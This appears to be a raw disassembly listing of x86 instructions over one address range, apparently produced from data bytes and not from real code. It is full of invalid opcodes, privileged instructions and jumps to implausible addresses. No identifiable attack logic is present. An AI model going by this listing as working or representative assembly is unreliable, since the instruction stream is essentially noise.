  423002:	mov    dh,0xb4
  423004:	mov    edx,0xb5f4e42f
  423009:	bnd addr16 jl 0x423010
  42300d:	and    al,0x9f
  42300f:	mov    al,ds:0x2955a289
  423014:	fistp  WORD PTR [eax+0x2633039e]
  42301a:	mov    bh,0xe8
  42301c:	mov    ds,WORD PTR [edx]
  42301e:	mov    ah,0xd1
  423020:	and    al,0x66
  423022:	out    0xba,al
  423024:	pmaxsw mm0,QWORD PTR [esi+0xa]
  423028:	and    BYTE PTR [esi-0x3b],ch
  42302b:	add    al,0xf
  42302d:	int3   
  42302e:	das    
  42302f:	push   ecx
  423030:	jmp    0x422fd7
  423032:	out    dx,al
  423033:	scas   al,BYTE PTR es:[edi]
  423034:	imul   eax,DWORD PTR [ebp+eax*4-0x5c19d2b2],0x6f9b9d80
  42303f:	int3   
  423040:	loop   0x423042
	...
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230b5:	push   edx
  4230b6:	jnp    0x4230b5
  4230b8:	(bad)  
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	stc    
  4230c1:	push   ecx
  4230c2:	popf   
  4230c3:	or     cl,BYTE PTR [edi]
  4230c5:	jbe    0x4230c8
  4230c7:	add    ch,dh
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    BYTE PTR [edi-0x5099363b],ch
  4230d1:	push   edx
  4230d2:	xchg   esi,eax
  4230d3:	out    dx,al
  4230d4:	and    eax,0x8f278cd5
  4230d9:	ds xor al,0xb2
  4230dc:	add    edi,DWORD PTR [edi-0x73]
  4230df:	and    DWORD PTR [edi],0x40
  4230e2:	sub    bh,BYTE PTR [eax+0x6caae848]
  4230e8:	mov    bh,0xcf
  4230ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230eb:	cdq    
  4230ec:	out    0xaf,al
  4230ee:	xor    ebx,DWORD PTR [esi+ebx*2+0x4e]
  4230f2:	lock lods ax,WORD PTR ds:[esi]
  4230f5:	dec    esp
  4230f6:	jnp    0x423101
  4230f8:	sub    dh,BYTE PTR [eax]
  4230fa:	test   BYTE PTR [ebx],al
  4230fc:	jo     0x4230e7
  4230fe:	data16 mov BYTE PTR [ebx],bh
  423101:	lods   eax,DWORD PTR ds:[esi]
  423102:	in     al,0x2e
  423104:	fsub   st(5),st
  423106:	xchg   esp,eax
  423107:	mov    al,0xed
  423109:	mov    ebp,0x37d12f21
  42310e:	ret    
  42310f:	mov    BYTE PTR [edi-0x1a],bl
  423112:	xchg   edx,eax
  423113:	jge    0x423179
  423115:	cdq    
  423116:	test   BYTE PTR [edi+0x5],0x46
  42311a:	or     eax,DWORD PTR [edx]
  42311c:	icebp  
  42311d:	xchg   edi,eax
  42311e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42311f:	push   ds
  423120:	sbb    DWORD PTR [esi],0x2b18b429
  423126:	fucomi st,st(5)
  423128:	adc    bh,BYTE PTR [eax-0x7f717fbb]
  42312e:	mov    esp,0xcfa2a1b2
  423133:	adc    eax,0xb80560a5
  423138:	out    dx,al
  423139:	inc    BYTE PTR [ebx-0x52edab3b]
  42313f:	xor    DWORD PTR [esp+edx*2-0x16],esi
  423143:	pop    ds
  423144:	or     esi,ebp
  423146:	sub    BYTE PTR [eax],dh
  423148:	mov    ss,WORD PTR [edx-0x2]
  42314b:	pop    ecx
  42314c:	fsub   DWORD PTR [edi]
  42314e:	dec    ebx
  42314f:	jle    0x423190
  423151:	test   eax,0xa8085037
  423156:	mov    ds:0xb97f2151,al
  42315b:	lock mov dl,0x40
  42315e:	push   0xedce97d9
  423163:	inc    ebx
  423164:	aad    0xe0
  423166:	inc    edx
  423167:	jmp    0x5086e225
  42316c:	push   0xffffff96
  42316e:	pop    ebx
  42316f:	test   al,0x85
  423171:	mov    ebx,0x6a49d9e4
  423176:	push   edi
  423177:	cmc    
  423178:	add    DWORD PTR [edx*8+0x686a6a84],ecx
  42317f:	and    esi,edi
  423181:	inc    eax
  423182:	xor    DWORD PTR [edx],edx
  423184:	inc    esi
  423185:	xchg   ebx,eax
  423186:	mov    cl,BYTE PTR [esi]
  423188:	out    0x1a,eax
  42318a:	scas   al,BYTE PTR es:[edi]
  42318b:	in     al,0x95
  42318d:	pop    ebp
  42318e:	test   esi,ecx
  423190:	mov    ds:0xec49d017,al
  423195:	pop    ds
  423196:	push   esi
  423197:	call   0xcb6476b4
  42319c:	icebp  
  42319d:	in     eax,0x18
  42319f:	sti    
  4231a0:	mov    edi,0x4006610a
  4231a5:	inc    esp
  4231a6:	mov    DWORD PTR [eax-0x14477d2c],edx
  4231ac:	xchg   ebx,eax
  4231ad:	popa   
  4231ae:	sub    BYTE PTR [esi+0x4c],dh
  4231b1:	mov    edi,0x45d183c5
  4231b6:	sub    al,0xc
  4231b8:	adc    ecx,DWORD PTR ds:0x9c003ddb
  4231be:	mov    al,ds:0xa52a
	...
  423233:	add    BYTE PTR [edi-0x10085213],cl
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0xa303b6b0
  423243:	sbb    eax,DWORD PTR [edi+esi*2]
  423246:	add    DWORD PTR [eax],eax
  423248:	cmc    
  423249:	add    BYTE PTR [eax],al
  42324b:	add    ch,ah
  42324d:	scas   eax,DWORD PTR es:[edi]
  42324e:	bswap  ebx
  423250:	jnp    0x4231ea
  423252:	(bad)  
  423253:	push   ds
  423254:	inc    ebp
  423255:	sar    DWORD PTR [ebx],cl
  423257:	jmp    0xf1ec:0x2b393dca
  42325e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42325f:	mov    ds:0xe3c33884,eax
  423264:	pop    edi
  423265:	pushf  
  423266:	lahf   
  423267:	ds inc edx
  423269:	imul   ebx,esi,0x20
  42326c:	in     eax,dx
  42326d:	inc    BYTE PTR [edi]
  42326f:	ds cs inc edi
  423272:	repnz outs dx,BYTE PTR ds:[esi]
  423274:	jmp    0x42327b
  423276:	dec    ebx
  423277:	push   ds
  423278:	ret    0x68c6
  42327b:	fisub  WORD PTR [edi-0x318e4071]
  423281:	push   ecx
  423282:	dec    esi
  423283:	mov    al,ds:0x6e3a9211
  423288:	add    DWORD PTR [ecx],0xf2f5f5a1
  42328e:	rol    BYTE PTR ss:[ecx],cl
  423291:	mov    edx,0xc2928354
  423296:	dec    eax
  423297:	dec    eax
  423298:	cld    
  423299:	mov    eax,0xb9e94fe6
  42329e:	stos   DWORD PTR es:[edi],eax
  42329f:	push   ecx
  4232a0:	or     eax,0xd7d88b5b
  4232a5:	dec    esi
  4232a6:	stos   BYTE PTR es:[edi],al
  4232a7:	push   edx
  4232a8:	stos   DWORD PTR es:[edi],eax
  4232a9:	or     edi,DWORD PTR [esi-0xc7cb74b]
  4232af:	ret    
  4232b0:	test   BYTE PTR [ecx],cl
  4232b2:	test   al,0xad
  4232b4:	xor    BYTE PTR [esi+edx*4-0x30],ch
  4232b8:	push   edx
  4232b9:	shl    esp,0x8d
  4232bc:	mov    dl,0xb1
  4232be:	inc    edx
  4232bf:	pop    ecx
  4232c0:	pop    edx
  4232c1:	popf   
  4232c2:	push   es
  4232c3:	jg     0x42332c
  4232c5:	sub    cl,BYTE PTR [esi]
  4232c7:	inc    ecx
  4232c8:	int3   
  4232c9:	mov    cl,0x1d
  4232cb:	inc    edi
  4232cc:	or     al,0xc6
  4232ce:	mov    ebx,0x46f8dc49
  4232d3:	ins    BYTE PTR es:[edi],dx
  4232d4:	aam    0xad
  4232d6:	adc    al,0x96
  4232d8:	daa    
  4232d9:	jne    0x423316
  4232db:	pop    edi
  4232dc:	in     eax,0x4d
  4232de:	cmp    ecx,esi
  4232e0:	and    eax,0xc750b75e
  4232e5:	lods   eax,DWORD PTR ds:[esi]
  4232e6:	and    al,0x29
  4232e8:	sti    
  4232e9:	push   0x2
  4232eb:	fst    DWORD PTR [eax]
  4232ed:	or     al,0xb2
  4232ef:	(bad)  
  4232f0:	adc    cl,cl
  4232f2:	lods   al,BYTE PTR ds:[esi]
  4232f3:	push   edx
  4232f4:	inc    edx
  4232f5:	and    BYTE PTR [ebx+0x10],dl
  4232f8:	int3   
  4232f9:	sub    al,0xf2
  4232fb:	mov    al,ds:0xa03657c9
  423300:	jbe    0x42330c
  423302:	shr    edx,1
  423304:	lods   al,BYTE PTR ds:[esi]
  423305:	ficom  DWORD PTR ds:0x189c84ed
  42330b:	sbb    BYTE PTR [esi+0x46b81eee],bh
  423311:	aas    
  423312:	enter  0x310d,0xda
  423316:	or     dh,0x8c
  423319:	clts   
  42331b:	mov    ch,0x9d
  42331d:	jb     0x423364
  42331f:	call   0x86cde93a
  423324:	and    dl,dl
  423326:	pop    ds
  423327:	gs cmp al,0xe6
  42332a:	mov    dl,0xcd
  42332c:	push   ebx
  42332d:	mov    edx,0x8bad94e0
  423332:	push   es
  423333:	les    edx,FWORD PTR [esp+edi*2+0x7e]
  423337:	rcr    DWORD PTR [esi],cl
  423339:	and    dl,al
  42333b:	fmul   DWORD PTR [ebx-0xa4133ea]
	...
  4233b1:	add    BYTE PTR [eax],al
  4233b3:	add    BYTE PTR [edx-0x7e],dl
  4233b6:	cs imul edi,esi,0x4bb57ed
  4233bd:	mov    eax,ds:0x46e98e4a
  4233c2:	xor    BYTE PTR [ebp+0x177f9],cl
  4233c8:	cmc    
  4233c9:	add    BYTE PTR [eax],al
  4233cb:	add    BYTE PTR [ecx],dh
  4233cd:	mov    bh,0xcf
  4233cf:	jecxz  0x423371
  4233d1:	inc    edi
  4233d2:	pavgw  mm2,QWORD PTR [edx-0x733ce040]
  4233d9:	dec    eax
  4233da:	or     DWORD PTR ds:0x4a64494a,ebx
  4233e0:	mov    es,WORD PTR [edx+0x3c]
  4233e3:	popf   
  4233e4:	cli    
  4233e5:	fild   QWORD PTR [ecx+esi*2]
  4233e8:	or     ebx,DWORD PTR [eax+0x30e685b5]
  4233ee:	in     al,0x6f
  4233f0:	cmp    dh,ch
  4233f2:	cmp    BYTE PTR [edi+ebp*4+0x74],dh
  4233f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233f7:	push   esi
  4233f8:	into   
  4233f9:	xor    BYTE PTR [edx+0x59],bl
  4233fc:	retf   
  4233fd:	xor    ch,BYTE PTR [edx-0x39366324]
  423403:	add    eax,0x695dcdc8
  423408:	sbb    eax,0x50961c8b
  42340d:	jp     0x4233bc
  42340f:	mov    ebp,0xdcbd8d1f
  423414:	repnz clc 
  423416:	cli    
  423417:	or     eax,0xeb728144
  42341c:	in     eax,0x7e
  42341e:	or     BYTE PTR [eax],al
  423420:	and    BYTE PTR [ebp-0x27],dl
  423423:	jmp    0x42343c
  423425:	add    cl,cl
  423427:	mov    BYTE PTR [ebx],ch
  423429:	push   0x6b
  42342b:	or     DWORD PTR [edi-0x59],esi
  42342e:	push   eax
  42342f:	sbb    DWORD PTR [edx+0x66da984b],edi
  423435:	jg     0x4233f7
  423437:	inc    esp
  423438:	cld    
  423439:	add    al,0x3f
  42343b:	in     al,dx
  42343c:	rcl    BYTE PTR [ecx],cl
  42343e:	sbb    ebp,ebx
  423440:	push   ebp
  423441:	dec    edi
  423442:	mov    bl,0x29
  423444:	ret    0x7c19
  423447:	xor    BYTE PTR [edi+esi*2+0x337d0cab],bl
  42344e:	loop   0x4234c3
  423450:	mov    ds:0x4d919e6c,eax
  423455:	inc    ebp
  423456:	in     al,0x98
  423458:	mov    dh,0xec
  42345a:	sub    al,0x12
  42345c:	mov    al,ds:0x9b2f8c3d
  423461:	push   edi
  423462:	adc    cl,BYTE PTR [esp+edx*2]
  423465:	retf   0x6b53
  423468:	imul   esp,DWORD PTR [edi+0x9],0x0
  42346c:	adc    DWORD PTR [esi+ecx*2-0x1f784524],edx
  423473:	mov    ch,BYTE PTR [ebp-0x25f6990b]
  423479:	cld    
  42347a:	pop    esi
  42347b:	jae    0x423402
  42347d:	add    al,0x17
  42347f:	and    BYTE PTR [bp+di-0x6cf7],dh
  423484:	adc    DWORD PTR [edi],0x92a1e6ee
  42348a:	sti    
  42348b:	(bad)  
  42348c:	addr16 add eax,0xc3b4f8c2
  423492:	test   DWORD PTR [edi+0x5c6b84bc],eax
  423498:	xor    ah,dh
  42349a:	add    ebx,ecx
  42349c:	out    0x50,al
  42349e:	icebp  
  42349f:	xchg   ebp,eax
  4234a0:	pop    edx
  4234a1:	jl     0x4234d2
  4234a3:	into   
  4234a4:	xchg   esp,eax
  4234a5:	cmp    al,0x79
  4234a7:	sbb    dl,BYTE PTR [ebx+0x62]
  4234aa:	push   esp
  4234ab:	pop    ebx
  4234ac:	sti    
  4234ad:	xchg   cl,bh
  4234af:	ret    
  4234b0:	xor    esi,DWORD PTR [edi]
  4234b2:	mov    eax,DWORD PTR [ebp-0x7105bbf2]
  4234b8:	dec    ecx
  4234b9:	pop    edi
  4234ba:	mov    cl,0xe3
  4234bc:	int    0x43
  4234be:	out    0x77,eax
  4234c0:	fild   DWORD PTR [eax]
	...
  423532:	add    BYTE PTR [eax],al
  423534:	call   0xfa77:0xbf778fae
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x76
  423541:	repnz cwde 
  423543:	and    al,0xee
  423545:	js     0x423548
  423547:	add    ch,dh
  423549:	add    BYTE PTR [eax],al
  42354b:	add    BYTE PTR [edx],bh
  42354d:	rcl    BYTE PTR [eax+0x36f694ea],1
  423553:	repnz dec edi
  423555:	pop    eax
  423556:	int3   
  423557:	xor    cl,ch
  423559:	(bad)  
  42355a:	xor    al,0xb8
  42355c:	fwait
  42355d:	mov    ds:0xc20715b3,al
  423562:	ja     0x42358d
  423564:	(bad)  
  423565:	mov    dh,BYTE PTR [ecx+edi*4-0x50]
  423569:	adc    DWORD PTR [ebx],edi
  42356b:	xchg   esi,eax
  42356c:	sbb    ecx,eax
  42356e:	fsubr  st,st(1)
  423570:	push   edi
  423571:	pushf  
  423572:	outs   dx,DWORD PTR ds:[esi]
  423573:	jno    0x4234fa
  423575:	sar    BYTE PTR [ecx+eiz*1-0x4c555ff4],cl
  42357c:	pop    ebp
  42357d:	adc    ah,BYTE PTR [esi-0x4ad56a84]
  423583:	push   ss
  423584:	push   eax
  423585:	mov    al,ds:0x3addc093
  42358a:	pop    ds
  42358b:	hlt    
  42358c:	aam    0xa1
  42358e:	rcl    BYTE PTR [edi+ecx*2-0x8],0x72
  423593:	push   ss
  423594:	loop   0x423558
  423596:	fdiv   QWORD PTR [ecx]
  423598:	jg     0x4235d3
  42359a:	nop
  42359b:	or     BYTE PTR [edx+0x29],0xa
  42359f:	ja     0x4235eb
  4235a1:	jmp    0x615c18b2
  4235a6:	mov    bh,0x3e
  4235a8:	out    0xc0,al
  4235aa:	fist   WORD PTR [ebx]
  4235ac:	push   0x2eb618bb
  4235b1:	out    dx,al
  4235b2:	retf   
  4235b3:	cmp    cl,cl
  4235b5:	shl    DWORD PTR [esi],1
  4235b7:	dec    eax
  4235b8:	jns    0x423607
  4235ba:	mov    BYTE PTR [ecx],dh
  4235bc:	pusha  
  4235bd:	and    ecx,esp
  4235bf:	scas   eax,DWORD PTR es:[edi]
  4235c0:	(bad)  
  4235c1:	in     eax,dx
  4235c2:	into   
  4235c3:	fistp  WORD PTR [ebx+0x15e9b33c]
  4235c9:	and    esi,DWORD PTR [ebx]
  4235cb:	fmul   QWORD PTR [eax]
  4235cd:	dec    edi
  4235ce:	or     ecx,eax
  4235d0:	and    BYTE PTR [ebp+0x2c792170],ah
  4235d6:	(bad)  
  4235d7:	adc    eax,0xa4f4b61e
  4235dc:	xchg   edi,eax
  4235dd:	mov    DWORD PTR [ebx+0x64c69624],ecx
  4235e3:	push   cs
  4235e4:	loope  0x42362b
  4235e6:	jmp    0x3ce:0x18799ba8
  4235ed:	shl    DWORD PTR [eax+0x6f],1
  4235f0:	mov    esi,0x99c0dcd6
  4235f5:	mov    edx,DWORD PTR [ebx]
  4235f7:	inc    esi
  4235f8:	inc    ebx
  4235f9:	pop    ebx
  4235fa:	fsub   st(0),st
  4235fc:	cmp    eax,0xb6298eb5
  423601:	out    dx,eax
  423602:	add    eax,0xa7d696a1
  423607:	mov    esp,0xed369376
  42360c:	xor    BYTE PTR [ecx],ah
  42360e:	fisub  WORD PTR [eax-0x4e3291c0]
  423614:	push   ds
  423615:	jle    0x42363f
  423617:	clc    
  423618:	add    ch,BYTE PTR [ecx-0x55744f9c]
  42361e:	rcl    DWORD PTR [ecx+0x3d],cl
  423621:	in     al,0x39
  423623:	xchg   BYTE PTR fs:[esi+0x5d512a23],dh
  42362a:	in     al,0x2
  42362c:	lahf   
  42362d:	shl    DWORD PTR [esi],0xa0
  423630:	and    al,0xc9
  423632:	dec    ebp
  423633:	ret    
  423634:	add    BYTE PTR [edx+0x3d28d9c0],0x6
  42363b:	xchg   BYTE PTR [ecx],dh
  42363d:	and    esp,DWORD PTR [esi]
  42363f:	add    DWORD PTR [eax+eax*1],0x0
	...
  4236b3:	add    BYTE PTR [edi],ah
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm1,QWORD PTR [ecx-0x1c491c71]
  4236c5:	jns    0x4236c8
  4236c7:	add    ch,dh
  4236c9:	add    BYTE PTR [eax],al
  4236cb:	add    BYTE PTR [ebp+esi*4-0x5c],cl
  4236cf:	les    eax,FWORD PTR [eax+0x331b889a]
  4236d5:	mov    ah,0x4f
  4236d7:	fisubr WORD PTR [edx+0x46]
  4236da:	ja     0x42373c
  4236dc:	outs   dx,BYTE PTR ds:[esi]
  4236dd:	cdq    
  4236de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236df:	ins    BYTE PTR es:[edi],dx
  4236e0:	mov    WORD PTR [ebp+0xd],?
  4236e3:	adc    ebx,0x44c8e765
  4236e9:	jae    0x423732
  4236eb:	pop    es
  4236ec:	sub    al,0x4c
  4236ee:	cmp    esi,edx
  4236f0:	or     dh,al
  4236f2:	and    al,0xaa
  4236f4:	jl     0x423683
  4236f6:	pop    es
  4236f7:	inc    edx
  4236f8:	jge    0x4236cf
  4236fa:	and    ebp,DWORD PTR [edx+0x63]
  4236fd:	pop    eax
  4236fe:	jnp    0x4236f0
  423700:	bound  esi,QWORD PTR [ebx+0x12eae2a9]
  423706:	loope  0x423737
  423708:	js     0x423737
  42370a:	cmp    BYTE PTR [eax-0x7a895a9d],al
  423710:	inc    esi
  423711:	xchg   ebp,eax
  423712:	jg     0x4236f8
  423714:	fidiv  WORD PTR [ebp-0x7a71ef50]
  42371a:	push   ebx
  42371b:	xor    eax,0xf5b56ae1
  423720:	jnp    0x42379b
  423722:	xchg   al,bl
  423724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423725:	jmp    0x8e79:0xcf5cd51b
  42372c:	mov    ebx,0x60e3865
  423731:	jo     0x4236de
  423733:	(bad)  
  423736:	scas   al,BYTE PTR es:[edi]
  423737:	dec    edi
  423738:	ret    
  423739:	pop    es
  42373a:	push   esp
  42373b:	js     0x42373a
  42373d:	lock ror DWORD PTR [ebx+esi*8-0x1504ac4b],1
  423745:	cld    
  423746:	std    
  423747:	push   ss
  423748:	xor    al,0x95
  42374a:	sbb    DWORD PTR [esi],ebp
  42374c:	bnd jno 0x423717
  42374f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423750:	inc    edx
  423751:	mov    ebx,DWORD PTR [ecx-0x3a]
  423754:	push   esp
  423755:	aaa    
  423756:	push   ebx
  423757:	add    al,0xae
  423759:	shl    DWORD PTR [edx+0x4d],cl
  42375c:	mov    ecx,0x720215c8
  423761:	jmp    0x4df36be9
  423766:	sub    eax,0x5b27bff4
  42376b:	add    edx,eax
  42376d:	shl    DWORD PTR [edx-0x4cac1b3d],cl
  423773:	in     al,dx
  423774:	iret   
  423775:	pop    eax
  423776:	dec    esi
  423777:	bound  edi,QWORD PTR [ebx]
  423779:	jp     0x4236fd
  42377b:	push   eax
  42377c:	retf   0x60e5
  42377f:	sbb    dl,BYTE PTR [ecx-0xc4eae2a]
  423785:	jg     0x42375d
  423787:	in     eax,0xb7
  423789:	fimul  DWORD PTR [ebx+0x41401561]
  42378f:	cmp    edi,DWORD PTR [eax+0xa379644]
  423795:	(bad)  
  423796:	or     esi,DWORD PTR [edx+0x659e15fb]
  42379c:	cwde   
  42379d:	(bad)  
  42379e:	add    eax,0xc7315c64
  4237a3:	fisub  DWORD PTR [ecx]
  4237a5:	adc    esp,DWORD PTR [esi-0x117a396c]
  4237ab:	js     0x4237b0
  4237ad:	scas   al,BYTE PTR es:[edi]
  4237ae:	cmp    BYTE PTR [ecx+0x59745b72],0xe
  4237b5:	popf   
  4237b6:	adc    dl,BYTE PTR [ebx]
  4237b8:	aas    
  4237b9:	jp     0x423826
  4237bb:	out    dx,eax
  4237bc:	lea    esi,[edx-0x67]
  4237bf:	xor    eax,0xcc
	...
  423834:	int    0x39
  423836:	mov    eax,0xef97fc97
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	into   
  423841:	inc    ecx
  423842:	sub    DWORD PTR [edx-0x28],ebp
  423845:	jp     0x423848
  423847:	add    ch,dh
  423849:	add    BYTE PTR [eax],al
  42384b:	add    al,ch
  42384d:	(bad)  
  42384e:	jecxz  0x423859
  423850:	rol    BYTE PTR [edx],cl
  423852:	xor    bh,ch
  423854:	xor    BYTE PTR [esi],cl
  423856:	(bad)  
  423857:	retf   
  423858:	imul   ecx,DWORD PTR [ecx+0x2ed67a1e],0xffffff87
  42385f:	xchg   edx,eax
  423860:	or     al,0x36
  423862:	aas    
  423863:	xchg   esp,eax
  423864:	stc    
  423865:	jge    0x4237ed
  423867:	xor    al,0xdf
  423869:	out    0x59,al
  42386b:	out    dx,al
  42386c:	mov    DWORD PTR es:[edi+0x12],ebp
  423870:	xchg   esp,eax
  423871:	inc    eax
  423872:	clc    
  423873:	xor    al,0xfd
  423875:	lahf   
  423876:	dec    ebx
  423877:	jb     0x42385f
  423879:	test   BYTE PTR [esi+0x6647a61c],al
  42387f:	jp     0x423870
  423881:	sub    eax,edi
  423883:	int3   
  423884:	ret    
  423885:	into   
  423886:	or     DWORD PTR [edx-0x62],esp
  423889:	mov    eax,0x47121386
  42388e:	popf   
  42388f:	fisttp DWORD PTR [ecx+eax*2+0x3c]
  423893:	jg     0x4238a7
  423895:	dec    esp
  423896:	or     bl,cl
  423898:	sbb    eax,0xbcc4e0c
  42389d:	outs   dx,DWORD PTR ds:[esi]
  42389e:	or     bl,BYTE PTR [ebx]
  4238a0:	pop    ebx
  4238a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238a2:	cmp    BYTE PTR [ebx],ah
  4238a4:	cli    
  4238a5:	or     DWORD PTR ds:0x9f3cb303,eax
  4238ab:	xor    dl,BYTE PTR [edi-0x47]
  4238ae:	dec    edi
  4238af:	mov    ebp,0x66d578b8
  4238b4:	or     eax,0xdfe27c6
  4238b9:	shl    DWORD PTR [ebx],cl
  4238bb:	dec    ecx
  4238bc:	adc    edi,DWORD PTR [edx]
  4238be:	and    ebp,DWORD PTR [eax]
  4238c0:	test   eax,0x3e142357
  4238c5:	mov    ds,WORD PTR [esi-0x44b2a3f8]
  4238cb:	sbb    al,BYTE PTR [ebx+eax*4+0x15ee6998]
  4238d2:	sbb    al,0x7f
  4238d4:	mov    bh,0xec
  4238d6:	imul   ebx,DWORD PTR [edi],0x1e502754
  4238dc:	sti    
  4238dd:	scas   eax,DWORD PTR es:[edi]
  4238de:	mov    al,ds:0x86eea9f8
  4238e3:	jns    0x423907
  4238e5:	ds sub eax,0x4113ea94
  4238eb:	call   0x502f:0x7b6d56de
  4238f2:	mov    ebp,0x65cc87b6
  4238f7:	jnp    0x423947
  4238f9:	inc    esp
  4238fa:	data16 cli 
  4238fc:	xchg   ebp,eax
  4238fd:	sbb    eax,0x340abedf
  423902:	loop   0x4238f0
  423904:	sub    BYTE PTR [edx+0x257f3681],ah
  42390a:	retf   0x8351
  42390d:	scas   eax,DWORD PTR es:[edi]
  42390e:	dec    edx
  42390f:	in     eax,0xc2
  423911:	adc    BYTE PTR [ebp+0x6051e4b7],al
  423917:	inc    esp
  423918:	daa    
  423919:	mov    ecx,0x8b5a410a
  42391e:	and    eax,0xe383eeb3
  423923:	(bad)  
  423924:	daa    
  423925:	fild   DWORD PTR [edx]
  423927:	push   ds
  423928:	add    al,0x69
  42392a:	or     DWORD PTR [esi+0xb84e622],eax
  423930:	loope  0x4238cd
  423932:	loope  0x423952
  423934:	sbb    DWORD PTR [edx],ecx
  423936:	sbb    BYTE PTR [ecx+0x2e9aa085],bl
  42393c:	ins    BYTE PTR es:[edi],dx
  42393d:	inc    edi
  42393e:	mov    BYTE PTR [ecx],ch
  423940:	aam    0x0
	...
  4239b2:	add    BYTE PTR [eax],al
  4239b4:	xchg   esi,eax
  4239b5:	push   0x18
  4239b7:	mov    ah,bh
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    esi,gs
  4239c1:	loopne 0x4239ea
  4239c3:	xchg   esi,eax
  4239c4:	int    0x7b
  4239c6:	add    DWORD PTR [eax],eax
  4239c8:	cmc    
  4239c9:	add    BYTE PTR [eax],al
  4239cb:	add    ch,bh
  4239cd:	bound  ecx,QWORD PTR [edi+esi*8-0x39]
  4239d1:	scas   al,BYTE PTR es:[edi]
  4239d2:	out    dx,al
  4239d3:	mov    dh,0xc6
  4239d5:	arpl   ax,di
  4239d7:	sub    BYTE PTR [esi+0x50d11b4b],bh
  4239dd:	lea    esp,[eax-0x40b66275]
  4239e3:	push   ebx
  4239e4:	mov    esp,0xb6328145
  4239e9:	leave  
  4239ea:	mov    esi,0xdf7ed716
  4239ef:	adc    esp,DWORD PTR [esi-0x64]
  4239f2:	aad    0x44
  4239f4:	(bad)  
  4239f5:	mov    ds:0x31656fae,eax
  4239fa:	mov    cl,0xa8
  4239fc:	leave  
  4239fd:	push   cs
  4239fe:	cmp    al,0x83
  423a00:	sbb    eax,0xc3f2a455
  423a05:	mov    edi,0x3c99df3f
  423a0a:	xchg   ebx,eax
  423a0b:	or     cl,BYTE PTR [esi-0x178b7402]
  423a11:	xor    DWORD PTR [ecx-0x384aa33b],0x9853d52d
  423a1b:	mov    dl,0x8d
  423a1d:	add    BYTE PTR [ebx-0x5cd98687],0x85
  423a24:	cmc    
  423a25:	stc    
  423a26:	retf   0xe790
  423a29:	(bad)  
  423a2b:	jle    0x423a43
  423a2d:	jb     0x423a49
  423a2f:	retf   0x1161
  423a32:	push   eax
  423a33:	pusha  
  423a34:	push   es
  423a35:	add    edx,eax
  423a37:	fmul   QWORD PTR [edx-0x4ee7723b]
  423a3d:	retf   
  423a3e:	pop    edi
  423a3f:	pop    DWORD PTR [ebp+ebp*8+0x19f5173f]
  423a46:	sbb    eax,0xe680838c
  423a4b:	mov    ds:0x2a26b1c4,al
  423a50:	sbb    DWORD PTR [ebp-0x28],0xffffffe1
  423a54:	stos   BYTE PTR es:[edi],al
  423a55:	outs   dx,BYTE PTR ds:[esi]
  423a56:	and    esi,DWORD PTR [edi-0x48e173f2]
  423a5c:	aas    
  423a5d:	sub    eax,0x306f1998
  423a62:	aas    
  423a63:	pmullw mm7,QWORD PTR [esi+0x7b]
  423a67:	sbb    al,0x5c
  423a69:	aas    
  423a6a:	stc    
  423a6b:	xor    al,0x19
  423a6d:	loope  0x423a3f
  423a6f:	xor    DWORD PTR [ecx-0x74aa31bf],esp
  423a75:	dec    esi
  423a76:	aam    0xe3
  423a78:	dec    eax
  423a79:	fcmovnbe st,st(3)
  423a7b:	repnz pop ecx
  423a7d:	enter  0x5757,0xd0
  423a81:	xor    DWORD PTR [ebx+edx*4],ebp
  423a84:	dec    edx
  423a85:	or     al,0xf7
  423a87:	push   ecx
  423a88:	pusha  
  423a89:	cmp    edi,DWORD PTR [eax-0x5f]
  423a8c:	push   edi
  423a8d:	rcl    BYTE PTR [ebp+0x7d],1
  423a90:	(bad)  
  423a91:	hlt    
  423a92:	and    cl,BYTE PTR [ebp+ecx*2+0x5b]
  423a96:	ins    DWORD PTR es:[edi],dx
  423a97:	cli    
  423a98:	sbb    DWORD PTR [ebp+0x37],esp
  423a9b:	std    
  423a9c:	add    eax,esi
  423a9e:	inc    eax
  423a9f:	fdiv   QWORD PTR cs:[eax+0x4ab35ebf]
  423aa6:	and    BYTE PTR [ecx],0x99
  423aa9:	pop    edx
  423aaa:	mov    dh,0x7
  423aac:	(bad)  
  423aad:	cdq    
  423aae:	xchg   ecx,eax
  423aaf:	test   al,0x1a
  423ab1:	inc    edi
  423ab2:	gs loopne 0x423b11
  423ab5:	scas   al,BYTE PTR es:[edi]
  423ab6:	lahf   
  423ab7:	(bad)  
  423aba:	mov    DWORD PTR [ebp-0x3c],ecx
  423abd:	sbb    ch,BYTE PTR [edi]
  423abf:	nop
  423ac0:	xchg   BYTE PTR [eax],al
	...
  423b32:	add    BYTE PTR [eax],al
  423b34:	inc    esp
  423b35:	aaa    
  423b36:	dec    edx
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0x90
  423b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b42:	(bad)  
  423b43:	sti    
  423b44:	ret    0x17c
  423b47:	add    ch,dh
